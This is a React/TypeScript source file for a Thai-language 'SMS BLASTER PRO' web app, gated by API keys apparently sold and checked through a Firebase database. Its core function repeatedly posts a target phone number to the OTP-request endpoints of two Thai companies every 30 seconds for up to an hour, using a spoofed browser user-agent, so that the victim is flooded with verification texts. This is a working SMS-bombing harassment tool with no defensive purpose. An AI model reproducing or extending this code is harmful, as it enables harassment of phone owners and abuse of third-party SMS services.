
import { useState, useEffect, useRef } from "react";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useToast } from "@/components/ui/use-toast";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Terminal, Clock, SmartphoneCharging, Shield, Rocket, Award, Key } from "lucide-react";
import axios from "axios";

interface LogEntry {
  timestamp: string;
  phone: string;
  status: 'success' | 'error';
  message: string;
}

interface PhoneReport {
  reason: string;
  count: number;
}

const Index = () => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [minutes, setMinutes] = useState("1");
  const [loading, setLoading] = useState(false);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [remainingTime, setRemainingTime] = useState<number>(0);
  const [apiKey, setApiKey] = useState("");
  const [showKeyInput, setShowKeyInput] = useState(false);
  const [phoneReport, setPhoneReport] = useState<PhoneReport | null>(null);
  const timerRef = useRef<NodeJS.Timeout>();
  const { toast } = useToast();

  const validatePhoneNumber = (number: string) => {
    const regex = /^0\d{9}$/;
    return regex.test(number);
  };

  const checkPhoneReport = async (phone: string) => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/reports/${phone}.json`);
      if (response.data) {
        setPhoneReport(response.data);
        setShowKeyInput(true);
        toast({
          title: "⚠️ คำเตือน",
          description: `เบอร์นี้ถูกรายงานว่า: ${response.data.reason}`,
          variant: "destructive",
        });
      } else {
        setShowKeyInput(true);
      }
    } catch (error) {
      console.error("Error checking phone report:", error);
      setShowKeyInput(true);
    }
  };

  const validateApiKey = async (key: string) => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/keys/${key}.json`);
      if (response.data && response.data.active) {
        const expireDate = new Date(response.data.expireDate);
        if (expireDate > new Date()) {
          return true;
        } else {
          toast({
            title: "API Key หมดอายุ",
            description: "กรุณาติดต่อแอดมินเพื่อต่ออายุ Key",
            variant: "destructive",
          });
          return false;
        }
      }
      toast({
        title: "API Key ไม่ถูกต้อง",
        description: "กรุณาตรวจสอบ Key ของท่าน",
        variant: "destructive",
      });
      return false;
    } catch (error) {
      console.error("Error validating API key:", error);
      return false;
    }
  };

  const addLog = (phone: string, status: 'success' | 'error', message: string) => {
    setLogs(prev => [{
      timestamp: new Date().toLocaleTimeString(),
      phone,
      status,
      message
    }, ...prev]);
  };

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validatePhoneNumber(phoneNumber)) {
      toast({
        title: "หมายเลขโทรศัพท์ไม่ถูกต้อง",
        description: "กรุณากรอกหมายเลขโทรศัพท์ 10 หลัก ที่ขึ้นต้นด้วย 0",
        variant: "destructive",
      });
      return;
    }

    await checkPhoneReport(phoneNumber);
  };

  const handleApiKeySubmit = async () => {
    if (await validateApiKey(apiKey)) {
      startSMSBlast();
    }
  };

  const startSMSBlast = async () => {
    setLoading(true);
    const totalSeconds = parseInt(minutes) * 60;
    setRemainingTime(totalSeconds);
    addLog(phoneNumber, 'success', `เริ่มต้นการส่ง SMS เป็นเวลา ${minutes} นาที`);
    
    const sendSMS = async () => {
      const endpoints = [
        'https://openapi.bigc.co.th/customer/v1/otp',
        'https://api-sso.ch3plus.com/user/request-otp',
      ];

      const headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
      };

      for (const endpoint of endpoints) {
        try {
          await axios.post(endpoint, {
            phone_no: phoneNumber,
            tel: phoneNumber,
            type: "register"
          }, { headers });
          addLog(phoneNumber, 'success', `✓ ส่ง SMS สำเร็จผ่าน ${endpoint.split('/')[2]}`);
        } catch (error) {
          addLog(phoneNumber, 'error', `⚠ ไม่สามารถส่ง SMS ผ่าน ${endpoint.split('/')[2]}`);
          console.error(`Error with endpoint ${endpoint}:`, error);
        }
      }
    };

    const interval = setInterval(sendSMS, 30000);
    await sendSMS();

    setTimeout(() => {
      clearInterval(interval);
      setLoading(false);
      setRemainingTime(0);
      addLog(phoneNumber, 'success', `🏁 สิ้นสุดการส่ง SMS แล้ว`);
      toast({
        title: "สำเร็จ",
        description: `สิ้นสุดการส่ง SMS ไปยังหมายเลข ${phoneNumber}`,
      });
    }, totalSeconds * 1000);
  };

  return (
    <div className="min-h-screen p-6 bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900">
      <div className="max-w-7xl mx-auto">
        {/* Header Section */}
        <div className="text-center mb-8 animate-fadeIn">
          <h1 className="text-4xl font-bold bg-gradient-to-r from-blue-400 via-purple-500 to-pink-500 bg-clip-text text-transparent mb-2">
            SMS BLASTER PRO
          </h1>
          <p className="text-gray-400">ระบบส่ง SMS อัตโนมัติประสิทธิภาพสูง</p>
        </div>

        {/* Feature Cards */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
          <Card className="p-4 bg-black/40 border-gray-700 backdrop-blur-sm">
            <div className="flex items-center gap-2">
              <Rocket className="h-5 w-5 text-blue-400" />
              <h3 className="text-blue-400">ความเร็วสูง</h3>
            </div>
            <p className="text-gray-400 text-sm mt-2">ส่ง SMS ได้รวดเร็วและมีประสิทธิภาพ</p>
          </Card>
          <Card className="p-4 bg-black/40 border-gray-700 backdrop-blur-sm">
            <div className="flex items-center gap-2">
              <Shield className="h-5 w-5 text-green-400" />
              <h3 className="text-green-400">ปลอดภัย 100%</h3>
            </div>
            <p className="text-gray-400 text-sm mt-2">ระบบความปลอดภัยมาตรฐานสูงสุด</p>
          </Card>
          <Card className="p-4 bg-black/40 border-gray-700 backdrop-blur-sm">
            <div className="flex items-center gap-2">
              <Award className="h-5 w-5 text-purple-400" />
              <h3 className="text-purple-400">มืออาชีพ</h3>
            </div>
            <p className="text-gray-400 text-sm mt-2">บริการระดับพรีเมียม</p>
          </Card>
        </div>

        {/* Main Content */}
        <div className="flex flex-col md:flex-row gap-6">
          {/* Input Panel */}
          <div className="w-full md:w-1/2 animate-fadeIn">
            <Card className="p-6 backdrop-blur-sm bg-black/40 border-gray-700 shadow-2xl hover:shadow-blue-500/10 transition-all duration-300">
              <form onSubmit={handlePhoneSubmit} className="space-y-6">
                <div className="space-y-2">
                  <h2 className="text-2xl font-bold text-center bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">
                    ตั้งค่าการส่ง
                  </h2>
                  <p className="text-sm text-center text-gray-400">กรอกข้อมูลด้านล่างเพื่อเริ่มต้นใช้งาน</p>
                </div>

                <div className="space-y-4">
                  <div className="relative group">
                    <SmartphoneCharging className="absolute left-3 top-2.5 h-5 w-5 text-gray-400 group-hover:text-blue-400 transition-colors" />
                    <Input
                      type="tel"
                      placeholder="เบอร์โทรศัพท์ (เช่น 0812345678)"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      className="w-full pl-10 pr-4 py-2 bg-gray-800/50 border-gray-700 text-gray-100 placeholder:text-gray-500 focus:ring-2 focus:ring-blue-500 transition-all"
                      maxLength={10}
                    />
                  </div>

                  <div className="relative group">
                    <Clock className="absolute left-3 top-2.5 h-5 w-5 text-gray-400 group-hover:text-blue-400 transition-colors" />
                    <Input
                      type="number"
                      placeholder="ระยะเวลาที่ต้องการส่ง (นาที)"
                      value={minutes}
                      onChange={(e) => setMinutes(e.target.value)}
                      className="w-full pl-10 pr-4 py-2 bg-gray-800/50 border-gray-700 text-gray-100 placeholder:text-gray-500 focus:ring-2 focus:ring-blue-500 transition-all"
                      min="1"
                      max="60"
                    />
                  </div>

                  {showKeyInput && (
                    <div className="relative group">
                      <Key className="absolute left-3 top-2.5 h-5 w-5 text-gray-400 group-hover:text-blue-400 transition-colors" />
                      <Input
                        type="text"
                        placeholder="กรุณากรอก API Key"
                        value={apiKey}
                        onChange={(e) => setApiKey(e.target.value)}
                        className="w-full pl-10 pr-4 py-2 bg-gray-800/50 border-gray-700 text-gray-100 placeholder:text-gray-500 focus:ring-2 focus:ring-blue-500 transition-all"
                      />
                    </div>
                  )}

                  {remainingTime > 0 && (
                    <div className="text-center text-sm">
                      <span className="text-blue-400">เวลาที่เหลือ: </span>
                      <span className="text-white font-mono">
                        {Math.floor(remainingTime / 60)}:{(remainingTime % 60).toString().padStart(2, '0')}
                      </span>
                    </div>
                  )}

                  {phoneReport && (
                    <div className="p-3 bg-red-900/50 rounded-md border border-red-500/50">
                      <p className="text-red-400 text-sm">
                        ⚠️ เบอร์นี้ถูกรายงาน: {phoneReport.reason}
                      </p>
                      <p className="text-red-400 text-sm">
                        จำนวนรายงาน: {phoneReport.count} ครั้ง
                      </p>
                    </div>
                  )}

                  <Button
                    type={showKeyInput ? "button" : "submit"}
                    onClick={showKeyInput ? handleApiKeySubmit : undefined}
                    className="w-full py-2 font-medium transition-all duration-200 bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white shadow-lg hover:shadow-blue-500/20"
                    disabled={loading}
                  >
                    {loading ? (
                      <div className="flex items-center justify-center gap-2">
                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                        <span>กำลังส่ง...</span>
                      </div>
                    ) : (
                      <div className="flex items-center justify-center gap-2">
                        {showKeyInput ? (
                          <>
                            <Key className="h-4 w-4" />
                            <span>ยืนยัน API Key</span>
                          </>
                        ) : (
                          <>
                            <Rocket className="h-4 w-4" />
                            <span>ตรวจสอบเบอร์</span>
                          </>
                        )}
                      </div>
                    )}
                  </Button>
                </div>
              </form>
            </Card>
          </div>

          {/* Console Panel */}
          <div className="w-full md:w-1/2 animate-fadeIn">
            <Card className="h-[600px] p-6 backdrop-blur-sm bg-black/40 border-gray-700 shadow-2xl hover:shadow-green-500/10 transition-all duration-300">
              <div className="flex items-center gap-2 mb-4">
                <Terminal className="h-5 w-5 text-green-400" />
                <h3 className="text-lg font-semibold text-green-400">คอนโซลแสดงผล</h3>
              </div>
              <ScrollArea className="h-[500px] rounded-md border border-gray-700 bg-black/60 p-4">
                <div className="space-y-2">
                  {logs.map((log, index) => (
                    <div
                      key={index}
                      className={`p-2 rounded-md text-sm font-mono ${
                        log.status === 'success' ? 'bg-green-950/50 text-green-400' : 'bg-red-950/50 text-red-400'
                      } transition-all duration-200 hover:scale-[1.02] hover:shadow-lg`}
                    >
                      <span className="text-gray-500">[{log.timestamp}]</span>{' '}
                      <span className="text-blue-400">เบอร์ {log.phone}:</span>{' '}
                      {log.message}
                    </div>
                  ))}
                  {logs.length === 0 && (
                    <div className="text-gray-500 text-center py-4 animate-pulse">
                      รอการเริ่มต้นส่ง SMS...
                    </div>
                  )}
                </div>
              </ScrollArea>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Index;
